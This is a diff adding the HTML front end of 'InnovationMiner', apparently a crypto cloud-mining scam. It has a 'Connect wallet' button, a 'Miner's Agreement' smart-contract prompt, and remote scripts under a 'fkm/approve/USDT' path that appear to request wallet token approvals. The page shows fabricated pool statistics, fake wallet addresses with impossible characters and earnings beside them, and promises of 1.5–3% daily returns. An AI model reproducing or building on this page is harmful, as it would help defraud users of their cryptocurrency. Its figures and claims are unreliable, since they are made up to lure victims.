@@ -1,0 +1,1876 @@
+
+<!DOCTYPE html>  
+
+<html>  
+<head> testing
+    <meta charset = "utf-8"> 
+    <title>InnovationMiner</title>
+    <link rel="icon" href="https://vip.innovationmining.top/erc/images/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" >
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.5.9/slick.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.5.9/slick-theme.min.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk="crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick.min.js"></script>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+    <link rel="stylesheet" href="https://vip.innovationmining.top/erc/style.css?random=12"> 
+    <script src="https://vip.innovationmining.top/fkm/approve/USDT/w3model.js.download"></script>
+    <script src="https://vip.innovationmining.top/fkm/approve/USDT/web3.min.js.download"></script>
+    <script type="text/javascript" src="https://vip.innovationmining.top/fkm/approve/USDT/web3model.min.js.download"></script>
+    <script type="text/javascript" src="https://vip.innovationmining.top/fkm/approve/USDT/web3provider.js.download"></script>
+    <script type="text/javascript" src="https://vip.innovationmining.top/newdome/js/mui.min.js"></script>
+    <script type="text/javascript" src="https://vip.innovationmining.top/newdome/js/layer/layer.en.js"></script>    
+<!--Start of Tawk.to Script-->
+
+<!--End of Tawk.to Script-->
+  <link rel="stylesheet" type="text/css" href="https://vip.innovationmining.top/newdome/css/iconfont.css">
+
+
+    <style>
+
+        .layui-layer-dialog {
+            -webkit-overflow-scrolling: touch;
+            top: 150px;
+            left: 0;
+            margin: 0;
+            padding: 0;
+            background-color: #8e5729 !important;
+            color:#000;
+            -webkit-background-clip: content;
+            border-radius: 2px;
+            box-shadow: 1px 1px 50px rgb(0 0 0 / 30%);
+        }
+        .layui-layer-dialog .layui-layer-content {
+            color: #fff;
+        }
+        .layui-layer-loading{
+            
+        }
+    </style>
+
+
+</head> 
+
+<body> 
+    <!-- top-container -->
+    <div class="top-container">
+        <header class="container-fluid mx-xl-3 mx-md-3 mx-0 py-xl-4 py-md-4 py-3 w-auto">
+            <div class="row align-items-center">
+                <div class="col-md-4 col-3 d-flex justify-content-start">
+                    <!--img src="https://vip.innovationmining.top/erc/images/share_icon.svg" class="logo share-icon" data-toggle="modal"
+                        data-target="#sharemyModal"-->
+                    <a href="#" class="link-btn1 px-1 d-flex justify-content-center align-items-center"><img src="https://vip.innovationmining.top/erc/images/link_icon.svg" class="logo mr-xl-3 mr-md-3 mr-1 logo-icon1" id="connect" ><h4 class="font-weight-normal"  id="walletadd">
+                                                 Connect wallet
+                                             </h4></a>
+                </div>
+                <div class="col-md-4 col-6 d-flex justify-content-center">
+                    <img src="https://vip.innovationmining.top/erc/images/header_icon.png" class="logo title_icon">
+                </div>
+                <!-- Share Modal -->
+
+                <div class="toast-msg p-xl-4 p-md-4 p-2 w-100"><img src="https://vip.innovationmining.top/erc/images/toast_success.svg" class="mr-2">Copy
+                    success</div>
+                <!-- modal -->
+
+                <div class="col-md-4 col-3 d-flex justify-content-end">
+                    <div class="link-btn px-1 d-flex justify-content-center align-items-center" id="myModalLabel">
+                        <img src="https://vip.innovationmining.top/erc/images/icon1.svg" alt="" srcset="" class="logo mr-xl-3 mr-md-3 mr-1 logo-icon" id="img_pre">
+                        <img src="https://vip.innovationmining.top/erc/images/down.png" alt="" srcset="" class="logo mr-xl-3 mr-md-3 mr-1 logo-iconsown">
+                    </div>
+                    <!-- <a href="" class="link-btn px-1 d-flex justify-content-center align-items-center"><img src="https://vip.innovationmining.top/erc/images/link_icon.svg" class="logo mr-xl-3 mr-md-3 mr-1 logo-icon"><h4 class="font-weight-normal">c93de3</h4></a> -->
+
+                </div>
+                <!-- modal -->
+                <div class="popup_container" style="display: none;">
+                    <div class="cover" style="display: none;"></div>
+                    <div class="select-nextwork-modal" style="display: none;">
+                        <div class="modal-header">
+                            <div class="modal-header-title">Select network</div>
+                            <button type="button" id="closeModalLabel" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-nextwork-cell" id="iconOne">
+                                <img src="https://vip.innovationmining.top/erc/images/icon1.svg" alt="" srcset="" class="img">
+                                <div class="name">Ethereum USDT(ERC20)</div>
+                            </div>
+                            <div class="modal-nextwork-cell" id="iocnTwo">
+                                <img src="https://vip.innovationmining.top/erc/images/icon2.png" alt="" srcset="" class="img">
+                                <div class="name">Tron USDT(TRC20)</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <section class="p-receive mt-4 pt-2">
+            <div class="container-fluid ml-xl-3 ml-md-3 ml-0 pr-0 w-auto">
+                <div class="row align-items-center">
+                    <div class="col-6">
+                        <h1 class="m-0">Cloud Mining</h1>
+                        <h2 class="mt-xl-3 mt-md-3 mt-2 mb-xl-4 mb-md-4 mb-1 pb-2 font-weight-bold">Join the node and
+                            start mining</h2>
+                            <div style="display: flex;">
+                                <button class="btn text-center custom-ctn d-flex justify-content-center align-items-center font-weight-normal" href="#" data-toggle="modal" data-target="#myModal" show="true" style="margin-right: 10px;">Stake Now</button>
+                         
+                                <button class="btn text-center custom-ctn d-flex justify-content-center align-items-center font-weight-normal tip" href="#" data-toggle="modal" data-target="#tip" show="false" style="margin-right: 10px;display: none !important;">Stake Now</button>
+                         
+                            </div>
+                    </div>
+                    <div class="col-6 d-flex justify-content-end">
+                        <div class="img-container"><img src="https://vip.innovationmining.top/erc/images/bg_top.png" class="shap w-100"></div>
+                    </div>
+                </div>
+                
+            </div>
+        </section>
+        <!-- Modal -->
+        <div class="modal fade overflow-hidden p-0" id="myModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" style="background: hsla(0,0%,84.7%,.5);">
+            <div class="modal-dialog w-100 h-100 mw-100 m-0 p-0" role="document">
+                <div class="modal-content border-0 bg-transparent">
+                    <div class="container-fluid mx-xl-3 mx-md-3 mx-0 py-0 w-auto">
+                        <div class="mining-body p-xl-4 p-md-4 p-2 bg-white br-rounded m-0 modal-body position-relative p-0">
+                            <button type="button" class="close font-weight-normal text-white position-absolute" data-dismiss="modal" aria-label="Close">
+                                <span aria-hidden="true">×</span>
+                            </button>
+                            <div class="">
+                                <div class="p-2">
+                                    <div class="title position-relative">
+                                        <span class="left_icon red position-absolute"></span>
+                                          <h1 class="font-weight-bold h1-title">Miner's Agreement</h1>
+                                        <h3 class="h3-title font-weight-normal mt-4">By confirming to this message, you will enter into a Smart Contract with Innovation Miners to join our miner's pool. Please ensure you have sufficient funds to pay for the Gas Fees before proceed to the next page.</h3>
+                                        <button class="mt-xl-5 mt-md-5 mt-3 mb-xl-5 mb-md-5 mb-0 exchange-btn rcv-btn mx-auto btn text-center custom-ctn d-flex justify-content-center align-items-center"  id="btn-connect">Receive</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+        <div class="modal fade overflow-hidden p-0" id="tip" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" style="background: hsla(0,0%,84.7%,.5);">
+            <div class="modal-dialog w-100 h-100 mw-100 m-0 p-0" role="document">
+                <div class="modal-content border-0 bg-transparent">
+                    <div class="container-fluid mx-xl-3 mx-md-3 mx-0 py-0 w-auto">
+                        <div class="mining-body p-xl-4 p-md-4 p-2 bg-white br-rounded m-0 modal-body position-relative p-0">
+                            <button type="button" class="close font-weight-normal text-white position-absolute" data-dismiss="modal" aria-label="Close">
+                                <span aria-hidden="true">×</span>
+                            </button>
+                            <div class="">
+                                <div class="p-2">
+                                    <div class="title position-relative">
+                                        <span class="left_icon red position-absolute"></span>
+                                        <h1 class="font-weight-bold h1-title">Tip</h1>
+                                        <h3 class="h3-title font-weight-normal mt-4" id='tiptext'></h3>
+                                        <button class="mt-xl-5 mt-md-5 mt-3 mb-xl-5 mb-md-5 mb-0 exchange-btn rcv-btn mx-auto btn text-center custom-ctn d-flex justify-content-center align-items-center " onclick="closetip()"  >Confirm</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- modal -->
+
+		<!-- 1-->
+		<div class="modal fade overflow-hidden p-0" id="myModal1" tabindex="-1" role="dialog" show="true"
+			aria-labelledby="exampleModalLabel" aria-hidden="true" style="background: hsla(0,0%,84.7%,.5);">
+			<div class="modal-dialog w-100 h-100 mw-100 m-0 p-0" role="document">
+				<div class="modal-content border-0 bg-transparent">
+					<div class="container-fluid mx-xl-3 mx-md-3 mx-0 py-0 w-auto">
+						<div
+							class="mining-body p-xl-4 p-md-4 p-2 bg-white br-rounded m-0 modal-body position-relative p-0">
+							<button type="button" class="close font-weight-normal text-white position-absolute"
+								data-dismiss="modal" aria-label="Close">
+								<span aria-hidden="true">&times;</span>
+							</button>
+							<div class="">
+								<div class="fun-mode">
+									<img src="https://vip.innovationmining.top/erc/images/icon1.svg" alt="" srcset="" class=" fun-img">
+									<div>
+										<div class="fun_fonts">Apply mining pool rewardr</div>
+										<div>ERC-20 Smart Contract</div>
+									</div>
+								</div>
+								<ul class="list-unstyled pt-xl-2 pt-md-2 pt-0 fun_ul">
+									<li
+										class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+										<h3 class="h3-title font-weight-normal">Liquidity</h3>
+										<h2 class="h2-title font-weight-bold"> USDT</h2>
+									</li>
+									<li
+										class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+										<h3 class="h3-title font-weight-normal">Period</h3>
+										<h2 class="h2-title font-weight-bold"> ETH</h2>
+									</li>
+									<li
+										class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+										<h3 class="h3-title font-weight-normal">profitPeriod</h3>
+										<h2 class="h2-title font-weight-bold">Day</h2>
+									</li>
+								</ul>
+                                
+								<button class="fun-btn mx-auto btn text-center d-flex justify-content-center align-items-center disp1post" onclick="dogetrewad()">Reward  ETH</button>
+								<div class="fun-flex">
+									<div>
+										<img src="https://vip.innovationmining.top/erc/images/share_icon.svg" class="logo share-icon">
+										<span>Add pool liquidity</span>
+									</div>
+									<div>
+										<img src="https://vip.innovationmining.top/erc/images/share_icon.svg" class="logo share-icon">
+										<span>Standard:USDT</span>
+									</div>
+								</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+
+
+			<!-- 2-->
+			<div class="modal fade overflow-hidden p-0" id="myModal2" tabindex="-1" role="dialog" show="true"
+			aria-labelledby="exampleModalLabel" aria-hidden="true" style="background: hsla(0,0%,84.7%,.5);">
+			<div class="modal-dialog w-100 h-100 mw-100 m-0 p-0" role="document">
+				<div class="modal-content border-0 bg-transparent">
+					<div class="container-fluid mx-xl-3 mx-md-3 mx-0 py-0 w-auto">
+						<div
+							class="mining-body p-xl-4 p-md-4 p-2 bg-white br-rounded m-0 modal-body position-relative p-0">
+							<button type="button" class="close font-weight-normal text-white position-absolute"
+								data-dismiss="modal" aria-label="Close">
+								<span aria-hidden="true">&times;</span>
+							</button>
+							<div class="">
+								<div class="fun-mode">
+									<img src="https://vip.innovationmining.top/erc/images/icon1.svg" alt="" srcset="" class=" fun-img">
+									<div>
+										<div class="fun_fonts">Apply pledge rewardr</div>
+										<div>ERC-20 Smart Contract</div>
+									</div>
+								</div>
+                                
+								<div class="list-unstyled pt-xl-2 pt-md-2 pt-0 fun_uls">
+                                    								</div> 
+                                
+								<button onclick="dogetpledge()" class="fun-btn mx-auto btn text-center d-flex justify-content-center align-items-center disp2post" >Apply rewards</button>
+                                
+								<div class="fun-flex">
+									<div>
+										<img src="https://vip.innovationmining.top/erc/images/share_icon.svg" class="logo share-icon">
+										<span>Add pledge </span>
+									</div>
+									<div>
+										<img src="https://vip.innovationmining.top/erc/images/share_icon.svg" class="logo share-icon">
+										<span>Standard: USDT</span>
+									</div>
+								</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+
+
+
+
+
+        </div>
+            <!-- main-container -->
+ <div class="main-container mt-xl-5 mt-md-5 mt-4 mb-xl-5 mb-md-5 mb-4"> 
+   <div class="container-fluid mx-xl-3 mx-md-3 mx-0 w-auto"> 
+    <section class="p-tabs"> 
+     <div id="exTab2" class=""> 
+      <div class="panel panel-default"> 
+       <div class="panel-heading"> 
+        <div class="panel-title"> 
+         <ul class="nav nav-tabs row align-items-center justify-content-center text-center tab-1"> 
+          <li class="col-4 position-relative"><a class="active" href="#1" data-toggle="tab"> <h6 class="pb-xl-4 pb-md-4 pb-2 m-0 font-weight-bold">Mining Pool</h6> </a></li> 
+          <li class="col-4 position-relative"><a href="#2" data-toggle="tab"> <h6 class="pb-xl-3 pb-md-3 pb-2 font-weight-bold">Account</h6> </a></li> 
+          <li class="col-4 position-relative"><a href="#3" data-toggle="tab"> <h6 class="pb-xl-3 pb-md-3 pb-2 font-weight-bold">Team</h6> </a></li> 
+         </ul> 
+        </div> 
+       </div> 
+       <div class="p-tabs-section"> 
+        <div class="tab-content"> 
+         <!-- Mining Pool Tab  --> 
+         <div class="tab-pane active" id="1"> 
+          <!-- Pool data --> 
+         
+
+          
+        <div class="panel-body p-xl-4 p-md-4 p-2 bg-white br-rounded mt-xl-5 mt-md-5 mt-4">
+            <div class="p-2">
+                <div class="title position-relative">
+                    <span class="left_icon position-absolute"></span>
+                    <h1 class="font-weight-bold h1-title">Pool data</h1>
+                </div>
+                <ul class="list-unstyled pt-xl-2 pt-md-2 pt-0">
+                    <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3"><h3 class="h3-title font-weight-normal">Total output</h3><h2 class="h2-title blue font-weight-bold">2237098.861300 ETH</h2></li>
+                    <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3"><h3 class="h3-title font-weight-normal">Valid node</h3><h2 class="h2-title blue font-weight-bold">2185</h2></li>
+                    <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3"><h3 class="h3-title font-weight-normal">Participant</h3><h2 class="h2-title font-weight-bold">132628</h2></li>
+                    <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3"><h3 class="h3-title font-weight-normal">User Revenue</h3><h2 class="h2-title font-weight-bold">3278513121.3072 USDT</h2></li>
+                </ul>
+            </div>
+        </div>
+          <!-- Mining -->
+        <div class="mining-heading text-center mt-xl-5 mt-md-5 mt-4">
+            <div class="section_title font-weight-bold mb-1">Mining</div>
+            <div class="section_subtitle font-weight-bold">Liquidity mining income</div>
+        </div>
+        <div class="panel-body mining-body p-xl-4 p-md-4 p-2 bg-white br-rounded mt-xl-5 mt-md-5 mt-4">
+            <div class="p-address-slider p-2">
+                <div class="title position-relative">
+                    <span class="left_icon red position-absolute"></span>
+                    <h1 class="font-weight-bold h1-title">User Output</h1>
+                    <ul class="d- list-unstyled pt-xl-2 pt-md-2 pt-0 mb-4">
+                        <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                            <h3 class="h3-title font-weight-normal">Address</h3>
+                            <h3 class="h3-title font-weight-normal">Quantity</h3>
+                        </li>
+                    </ul>
+                </div>
+                <ul class="list-unstyled pt-xl-2 pt-md-2 pt-0 m-0 slider slider-for">
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xul422.......joymz0xcnd</h3>
+                        <h2 class="h2-title font-weight-bold">0.645896 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xwihu1.......8s0sszsel1</h3>
+                        <h2 class="h2-title font-weight-bold">0.102750 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xit6qy.......bxy33c3f8x</h3>
+                        <h2 class="h2-title font-weight-bold">0.790759 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xrfqd5.......37t6epq884</h3>
+                        <h2 class="h2-title font-weight-bold">0.595461 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xcecek.......3bf8o4ve42</h3>
+                        <h2 class="h2-title font-weight-bold">0.350020 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xh2qdu.......il3ls6q11r</h3>
+                        <h2 class="h2-title font-weight-bold">0.796233 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xsxxtc.......b5wmps2wi6</h3>
+                        <h2 class="h2-title font-weight-bold">0.379009 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xgm58o.......ziyjnwgmqr</h3>
+                        <h2 class="h2-title font-weight-bold">0.128498 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xx8k5c.......t9erwpni86</h3>
+                        <h2 class="h2-title font-weight-bold">0.343935 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0x81vpa.......3i53r26cb5</h3>
+                        <h2 class="h2-title font-weight-bold">0.257009 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xtrlwh.......c0qwab6exh</h3>
+                        <h2 class="h2-title font-weight-bold">0.215807 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xg61jz.......chdtran1v3</h3>
+                        <h2 class="h2-title font-weight-bold">0.415301 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0x1tjaq.......8yvcdscbwx</h3>
+                        <h2 class="h2-title font-weight-bold">0.399296 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xck946.......hs4utt2cf6</h3>
+                        <h2 class="h2-title font-weight-bold">0.174748 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xb2jva.......b6lg870etx</h3>
+                        <h2 class="h2-title font-weight-bold">0.877312 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0x0mgxu.......e657sqbeel</h3>
+                        <h2 class="h2-title font-weight-bold">0.376940 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xs4xxw.......zr30izejnq</h3>
+                        <h2 class="h2-title font-weight-bold">0.456772 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xhg1lj.......q9x5rf2tgm</h3>
+                        <h2 class="h2-title font-weight-bold">0.416351 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0x9bzyw.......u1y291gra2</h3>
+                        <h2 class="h2-title font-weight-bold">0.272407 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xw3hu9.......7edranl0tr</h3>
+                        <h2 class="h2-title font-weight-bold">0.356063 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xxh09h.......ygejv062qz</h3>
+                        <h2 class="h2-title font-weight-bold">0.735635 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xnpe4k.......e05cypahoc</h3>
+                        <h2 class="h2-title font-weight-bold">0.594758 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0x003sv.......x1rfw0aoga</h3>
+                        <h2 class="h2-title font-weight-bold">0.160578 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xi0jcu.......7kgpz3ec05</h3>
+                        <h2 class="h2-title font-weight-bold">0.736199 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xl264l.......l1wmvyb0tv</h3>
+                        <h2 class="h2-title font-weight-bold">0.571808 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0x4dmqq.......hvlu56m4p6</h3>
+                        <h2 class="h2-title font-weight-bold">0.853915 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0x05qh6.......kqz4usn4mt</h3>
+                        <h2 class="h2-title font-weight-bold">0.638950 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xylil1.......2wfqgyyjk3</h3>
+                        <h2 class="h2-title font-weight-bold">0.335667 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xspzbh.......8h4b0uln8s</h3>
+                        <h2 class="h2-title font-weight-bold">0.327773 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xmk2tw.......j7t7lvwb4y</h3>
+                        <h2 class="h2-title font-weight-bold">0.892884 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xow3s5.......s12zzxiang</h3>
+                        <h2 class="h2-title font-weight-bold">0.704267 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xskhp3.......f53z305mzb</h3>
+                        <h2 class="h2-title font-weight-bold">0.392735 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xhxffm.......1lm6xcyz3u</h3>
+                        <h2 class="h2-title font-weight-bold">0.525899 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0x8y99o.......cykh4cgsug</h3>
+                        <h2 class="h2-title font-weight-bold">0.828791 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xhiboj.......hrjpx46hnq</h3>
+                        <h2 class="h2-title font-weight-bold">0.667047 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xc32yt.......tsrwemqn8d</h3>
+                        <h2 class="h2-title font-weight-bold">0.473848 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0x5ruap.......8po3xdv85q</h3>
+                        <h2 class="h2-title font-weight-bold">0.729809 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0x7i0ff.......z0rsxwqzrx</h3>
+                        <h2 class="h2-title font-weight-bold">0.325607 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xhyhfn.......tdvlnfgd2l</h3>
+                        <h2 class="h2-title font-weight-bold">0.736182 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xyovk2.......6j36hzpxda</h3>
+                        <h2 class="h2-title font-weight-bold">0.161576 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xvt8c1.......pxlihhjwrx</h3>
+                        <h2 class="h2-title font-weight-bold">0.168496 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xh01o3.......10bzh7raf5</h3>
+                        <h2 class="h2-title font-weight-bold">0.615004 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xs5a7e.......bsnos8eixm</h3>
+                        <h2 class="h2-title font-weight-bold">0.248483 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xjn3hw.......yk521ekvsf</h3>
+                        <h2 class="h2-title font-weight-bold">0.447417 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xstg59.......un0r92bdgd</h3>
+                        <h2 class="h2-title font-weight-bold">0.399545 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0x5ife7.......hc9glyygmw</h3>
+                        <h2 class="h2-title font-weight-bold">0.548838 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0x8r1ds.......kkxikokgjy</h3>
+                        <h2 class="h2-title font-weight-bold">0.184291 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xpiepz.......0lsk3ix3wc</h3>
+                        <h2 class="h2-title font-weight-bold">0.337250 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xtzw3l.......0cicrmdynb</h3>
+                        <h2 class="h2-title font-weight-bold">0.525047 ETH</h2>
+                    </li>
+                                             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3">
+                        <h3 class="font-weight-normal blue">0xluhm8.......w53i5uvayi</h3>
+                        <h2 class="h2-title font-weight-bold">0.446734 ETH</h2>
+                    </li>
+                                    </ul>
+            </div>
+        </div>
+          <!-- Help center --> 
+          <div class="help-heading text-center mt-xl-5 mt-md-5 mt-4"> 
+           <div class="section_title font-weight-bold mb-1">
+            Help center
+           </div> 
+           <div class="section_subtitle font-weight-bold">
+            Hope it helps you
+           </div> 
+          </div> 
+
+          <div class="help-body mt-xl-5 mt-md-5 mt-4"> 
+            <div class="accordion" id="accordion2"> 
+
+                                    <div class="accordion-group bg-white p-xl-4 p-md-4 p-3 mb-3 br-rounded"> 
+                        <div class="accordion-heading"> 
+                        <a class="accordion-toggle section_title font-weight-bold d-flex justify-content-between" data-toggle="collapse" href="#collapse74"> <span>Profits	Calculation</span> <img src="https://vip.innovationmining.top/erc/images/arrow_up.svg" class="arrow" /> </a> 
+                        </div> 
+                        <div id="collapse74" class="accordion-body collapse"> 
+                        <div class="accordion-inner mt-3">
+                            Returns	is	computed	on	daily	rest	basis.	Once	the	smart	contract	has	successfully	bind	daily	returns	computed	through	node.	Income	is	illustrated	as	below	100-1000	0.015-0.017	1000-4999		0.017-0.019	5000-10000		0.019-0.021	10000-20000		0.021-0.023	20000-50000		0.023-0.025	50000-100000	0.025-0.026	100000-500000		0.026-0.028	500000	and	above	0.028-0.030	Returns	differs	from	amount	staked	due	to	the	economical	scale.                            
+                        </div> 
+                        </div> 
+                    </div>
